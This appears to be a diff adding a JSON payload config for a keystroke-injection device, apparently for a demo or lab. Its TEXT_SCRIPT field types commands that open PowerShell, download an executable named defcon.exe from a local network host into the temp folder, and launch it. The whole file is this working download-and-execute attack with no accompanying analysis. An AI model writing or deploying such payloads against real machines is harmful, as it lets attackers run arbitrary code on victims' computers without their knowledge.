@@ -1,0 +1,6 @@
+{
+	"REPORT_HANDLE":"0x0013",
+	"REPORT_SIZE":11,
+	"REPORT_OPTYPE":"0x1b",
+	"TEXT_SCRIPT":"{L_WIN}+rpowershell.exe{ENTER}{SLEEP 500}$a=\"$env:temp\\defcon.exe\";(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.1/a',\"$a\"); start-process $a;{ENTER}"
+}
